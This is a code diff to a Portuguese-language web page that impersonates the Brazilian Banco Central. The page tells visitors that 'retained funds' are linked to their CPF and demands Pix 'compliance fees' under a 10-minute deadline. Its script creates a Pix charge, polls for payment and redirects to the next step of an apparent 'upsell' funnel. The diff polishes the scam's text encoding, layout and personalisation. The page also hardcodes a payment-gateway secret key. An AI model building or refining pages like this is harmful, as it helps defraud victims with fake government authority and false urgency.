@@ -1,4 +1,4 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
@@ -20,6 +20,8 @@
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
       background: #f8fafc;
       color: #1e293b;
+      margin: 0;
+      padding: 0;
     }
     .taxa-row {
       display: flex; justify-content: space-between; align-items: center;
@@ -51,7 +53,7 @@
     </div>
   </header>
 
-  <!-- CONTEÃšDO PRINCIPAL -->
+  <!-- CONTEUDO PRINCIPAL -->
   <main class="max-w-xl w-full mx-auto px-4 py-6 flex-1 space-y-4">
     
     <!-- ETAPA ATUAL -->
@@ -62,14 +64,14 @@
       <span class="text-blue-700 font-medium">Certificado de Conformidade e Desbloqueio</span>
     </div>
 
-    <!-- ALERTA DE PENDÃŠNCIA -->
+    <!-- ALERTA DE PENDENCIA -->
     <div class="bg-white rounded-2xl border border-red-200 shadow-sm overflow-hidden">
       <div class="bg-red-500 text-white px-4 py-2.5 flex items-center gap-2 font-bold text-sm">
         <i class="fa-solid fa-triangle-exclamation"></i>
         <span>SALDO RESIDUAL RETIDO LOCALIZADO</span>
       </div>
       <div class="p-5 space-y-3 text-sm text-slate-700 leading-relaxed">
-        <p>O Banco Central localizou um lote de valores retidos adicionais vinculado ao seu CPF. Para emissÃ£o do termo de quitaÃ§Ã£o e desbloqueio total dos valores, efetue o recolhimento da taxa de conformidade.</p>
+        <p>O Banco Central localizou um lote de valores retidos adicionais vinculado ao seu CPF. Para emiss&atilde;o do termo de quita&ccedil;&atilde;o e desbloqueio total dos valores, efetue o recolhimento da taxa de conformidade.</p>
         <div class="bg-amber-50 border border-amber-200 rounded-lg p-3 text-amber-900 text-xs flex items-center gap-2 font-medium">
           <i class="fa-solid fa-clock text-amber-600 text-base shrink-0"></i>
           <span>Prazo de liquida&ccedil;&atilde;o: <strong>10 minutos</strong> antes do cancelamento da ordem.</span>
@@ -86,7 +88,7 @@
       
       <div class="space-y-1">
                   <div class="taxa-row">
-            <span class="taxa-label">EmissÃ£o do Termo de QuitaÃ§Ã£o</span>
+            <span class="taxa-label">Emiss&atilde;o do Termo de Quita&ccedil;&atilde;o</span>
             <span class="taxa-value">R$ 28,40</span>
           </div>          <div class="taxa-row">
             <span class="taxa-label">Desbloqueio de saldo complementar</span>
@@ -99,8 +101,8 @@
       </div>
     </div>
 
-    <!-- BOTÃƒO DE AÃ‡ÃƒO -->
-    <button id="btn-pay" onclick="gerarPixUpsell()" class="w-full bg-[#1351b4] hover:bg-blue-700 text-white font-extrabold py-4 px-6 rounded-xl shadow-lg transition btn-pulse text-center flex items-center justify-center gap-3 text-base">
+    <!-- BOTAO DE ACAO -->
+    <button id="btn-pay" onclick="gerarPixUpsell()" class="w-full bg-[#1351b4] hover:bg-blue-700 text-white font-extrabold py-4 px-6 rounded-xl shadow-lg transition btn-pulse text-center flex items-center justify-center gap-3 text-base cursor-pointer">
       <i class="fa-brands fa-pix text-xl text-emerald-400"></i>
       <span>DESBLOQUEAR SALDO COMPLETO</span>
     </button>
@@ -165,9 +167,9 @@
     const FASTSOFT_AUTH = "Basic " + btoa("x:sk_cbb3917adbe1bdbcecf3e1bd76c86db8f509e8e3");
     let urlParams = new URLSearchParams(window.location.search);
     let cpf = (urlParams.get('cpf') || localStorage.getItem('userCPF') || '').replace(/\D/g, '');
-    let nome = urlParams.get('nome') || localStorage.getItem('userName') || 'BeneficiÃ¡rio';
+    let nome = urlParams.get('nome') || localStorage.getItem('userName') || 'Beneficiario';
 
-    if (nome) {
+    if (nome && nome !== 'Beneficiario') {
       document.getElementById('u-nome').textContent = nome;
       try { localStorage.setItem('userName', nome); } catch(e){}
     }
@@ -265,7 +267,6 @@
             if (st === "PAID" || st === "APPROVED" || st === "COMPLETED") {
               clearInterval(pollInterval);
               
-              // Redireciona para o prÃ³ximo passo
               let p = window.location.pathname;
               let bp = "";
               if (p.indexOf("/replay/9345488724234") !== -1) bp = "/replay/9345488724234";
